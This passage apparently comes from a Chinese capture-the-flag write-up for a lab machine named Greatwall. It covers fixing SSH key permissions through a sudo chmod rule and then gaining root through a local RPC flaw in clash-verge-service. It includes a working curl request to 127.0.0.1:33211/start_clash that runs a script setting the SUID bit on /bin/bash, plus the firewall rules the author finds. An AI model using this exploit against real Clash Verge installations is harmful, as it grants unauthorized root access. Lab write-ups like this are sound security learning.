Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.182.129' (ED25519) to the list of known hosts.
wall@192.168.182.129's password: 

┌──(kali㉿kali)-[~/temp/Greatwall]
└─$ ssh wall@192.168.182.129 -i wall -o "StrictHostKeyChecking=no"
wall@192.168.182.129's password:
```

尝试ssh连接，发现连接不上，开始反思是不是哪里不对，定位到了`.ssh`文件夹权限：

```bash
┌──(kali㉿kali)-[~/temp/Greatwall]
└─$ ls -la /home/kali/ | grep ssh
drwx------  2 kali kali  4096 Jun 18 11:55 .ssh

www-data@greatwall:/home/wall$ sudo -u wall /bin/chmod 700 .ssh

```

然后应该就能连上了，但是这里我在进行尝试时无意间删除了保护文件`authorized_keys`导致必须重新导入靶机进行操作：

```bash
www-data@greatwall:/$ cd /home
www-data@greatwall:/home$ ls -la
total 12
drwxr-xr-x  3 root root 4096 May 10 18:54 .
drwxr-xr-x 18 root root 4096 May 10 18:53 ..
drwx------  4 wall wall 4096 May 11 02:41 wall
www-data@greatwall:/home$ sudo -l
Matching Defaults entries for www-data on greatwall:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User www-data may run the following commands on greatwall:
    (wall) NOPASSWD: /bin/chmod
www-data@greatwall:/home$ sudo -u wall /bin/chmod 777 wall
www-data@greatwall:/home$ cd wall
www-data@greatwall:/home/wall$ ls -la
total 32
drwxrwxrwx 4 wall wall 4096 May 11 02:41 .
drwxr-xr-x 3 root root 4096 May 10 18:54 ..
lrwxrwxrwx 1 root root    9 May 11 00:15 .bash_history -> /dev/null
-rwx------ 1 wall wall  220 May 10 18:54 .bash_logout
-rwx------ 1 wall wall 3526 May 10 18:54 .bashrc
drwx------ 3 wall wall 4096 May 11 00:18 .local
-rwx------ 1 wall wall  807 May 10 18:54 .profile
drwxr-xr-x 2 wall wall 4096 May 11 02:41 .ssh
-rwx------ 1 wall wall 1808 May 11 00:25 user.flag
www-data@greatwall:/home/wall$ cd .ssh
www-data@greatwall:/home/wall/.ssh$ ls -la
total 20
drwxr-xr-x 2 wall wall 4096 May 11 02:41 .
drwxrwxrwx 4 wall wall 4096 May 11 02:41 ..
-rw-r--r-- 1 wall wall  568 May 11 02:41 authorized_keys
-rw------- 1 wall wall 2602 May 11 02:41 id_rsa
-rw-r--r-- 1 wall wall  568 May 11 02:41 id_rsa.pub
www-data@greatwall:/home/wall/.ssh$ cd ..
www-data@greatwall:/home/wall$ sudo -u wall /bin/chmod 700 .ssh
www-data@greatwall:/home/wall$ ls -la
total 32
drwxrwxrwx 4 wall wall 4096 May 11 02:41 .
drwxr-xr-x 3 root root 4096 May 10 18:54 ..
lrwxrwxrwx 1 root root    9 May 11 00:15 .bash_history -> /dev/null
-rwx------ 1 wall wall  220 May 10 18:54 .bash_logout
-rwx------ 1 wall wall 3526 May 10 18:54 .bashrc
drwx------ 3 wall wall 4096 May 11 00:18 .local
-rwx------ 1 wall wall  807 May 10 18:54 .profile
drwx------ 2 wall wall 4096 May 11 02:41 .ssh
-rwx------ 1 wall wall 1808 May 11 00:25 user.flag
www-data@greatwall:/home/wall$ sudo -u wall chmod 700 /home/wall/

```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202506190103383.png" alt="image-20250619002347652" style="zoom:50%;" />

注意一定要修改 wall 家目录权限！！！

### clash新发漏洞提权root

```bash
──(kali㉿kali)-[~/temp/Greatwall]
└─$ ssh wall@192.168.182.129 -i wall
Linux greatwall 6.1.0-32-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.129-1 (2025-03-06) x86_64

Last login: Thu Jun 19 00:23:22 2025 from 192.168.182.128
wall@greatwall:~$ sudo -l
Matching Defaults entries for wall on greatwall:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User wall may run the following commands on greatwall:
    (ALL) NOPASSWD: /usr/bin/systemctl start clash-verge-service
wall@greatwall:~$ whereis clash-verge-service
clash-verge-service: /usr/bin/clash-verge-service
```

这个漏洞我看到过，前一阵子有微信小程序发过文章，尝试执行并且搜索相关漏洞：

```bash
wall@greatwall:~$ sudo /usr/bin/systemctl start clash-verge-service
wall@greatwall:~$ sudo /usr/bin/systemctl status clash-verge-service
[sudo] password for wall: 
sudo: a password is required
wall@greatwall:~$ ss -tulnp
Netid               State                Recv-Q               Send-Q                             Local Address:Port                              Peer Address:Port               Process               
udp                 UNCONN               0                    0                                        0.0.0.0:68                                     0.0.0.0:*                                        
tcp                 LISTEN               0                    128                                      0.0.0.0:22                                     0.0.0.0:*                                        
tcp                 LISTEN               0                    128                                    127.0.0.1:33211                                  0.0.0.0:*                                        
tcp                 LISTEN               0                    128                                         [::]:22                                        [::]:*                                        
tcp                 LISTEN               0                    511                                            *:80                                           *:* 
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202506190103384.png" alt="image-20250619002740382" style="zoom: 50%;" />

阔以参考：

> https://zyen84kyvn.feishu.cn/docx/PXu6dsXf0onNdRxs8LfceNXjncb
>
> https://mp.weixin.qq.com/s/mRrwQKYsmr9KXUbu_jzDvQ
>
> https://mp.weixin.qq.com/s/K_0xp5m7NEhc7O3CGd1ldg

核心出在service服务，本地会监听33211端口，支持通过HTTP RPC的方式传递binpath参数进行命令调用。

由于限制了开放端口，故尝试在靶机本地进行利用：

```bash
wall@greatwall:/tmp$ echo '#!/bin/bash' > exp.sh
wall@greatwall:/tmp$ echo 'chmod +s /bin/bash' >> exp.sh
wall@greatwall:/tmp$ chmod +x exp.sh
wall@greatwall:/tmp$ ls -la /bin/bash
-rwxr-xr-x 1 root root 1265648 Mar 30  2024 /bin/bash
wall@greatwall:/tmp$ curl -s -I -X POST 'http://127.0.0.1:33211/start_clash' -H "Host: 127.0.0.1:33211" -H "Content-Type: application/json" -d '{"core_type":"verge-mihome","bin_path":"/tmp/exp.sh","config_dir":"","config_file":"/tmp/exp.sh","log_file":"/tmp/clash.log"}'
wall@greatwall:/tmp$ ls -la /bin/bash
-rwxr-xr-x 1 root root 1265648 Mar 30  2024 /bin/bash
```

失败了，可能是构造请求错误了。。。使用工具直接生成请求：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202506190103385.png" alt="image-20250619005158205" style="zoom:33%;" />

```bash
curl -X POST -H 'Content-Type: application/json' -d '{
"core_type":"verge-mihome",
"bin_path":"/tmp/exp.sh",
"config_dir":"1",
"config_file":"/tmp/exp.sh",
"log_file":"/tmp/clash.log"
}' 'https://127.0.0.1:33211/start_clash'
# curl: (35) OpenSSL/3.0.15: error:0A00010B:SSL routines::wrong version number
```

这是由于无意间写成了`https`。。。。。

```bash
wall@greatwall:/tmp$ curl -X POST -H 'Content-Type: application/json' -d '{
"core_type":"verge-mihome",
"bin_path":"/tmp/exp.sh",
"config_dir":"1",
"config_file":"/tmp/exp.sh",
"log_file":"/tmp/clash.log"
}' 'http://127.0.0.1:33211/start_clash'
{"code":0,"msg":"ok","data":null}
wall@greatwall:/tmp$ ls -la /bin/bash
-rwsr-sr-x 1 root root 1265648 Mar 30  2024 /bin/bash
wall@greatwall:/tmp$ cat clash.log 
Spawning process: /tmp/exp.sh -d 1 -f /tmp/exp.sh
```

这意味着上面的curl命令可以进行适当修改，也能完美生效了，下面阔以提权了：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202506190103386.png" alt="image-20250619005657000" style="zoom:50%;" />

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202506190103387.png" alt="image-20250619005723134" style="zoom:50%;" />

可爱捏。。。。。

## 一些隐藏信息的搜集

关于禁止流量出站的相关配置，进行查找一下：

```bash
bash-5.2# iptables -L
bash: iptables: command not found
bash-5.2# cat /etc/iptables/*
# Generated by iptables-save v1.8.9 (nf_tables) on Sun May 11 02:22:38 2025
*filter
:INPUT DROP [1:48]
:FORWARD DROP [0:0]
:OUTPUT DROP [4:176]
-A INPUT -i lo -j ACCEPT
-A INPUT -m conntrack --ctstate RELATED,ESTABLISHED -j ACCEPT
-A INPUT -p tcp -m tcp --dport 22 -j ACCEPT
-A INPUT -p tcp -m tcp --dport 80 -j ACCEPT
-A OUTPUT -m conntrack --ctstate RELATED,ESTABLISHED -j ACCEPT
-A OUTPUT -o lo -j ACCEPT
-A OUTPUT -p tcp -m tcp --dport 22 -j ACCEPT
-A OUTPUT -p tcp -m tcp --dport 80 -j ACCEPT
COMMIT
# Completed on Sun May 11 02:22:38 2025
```

限制了出战进站流量。。。。。

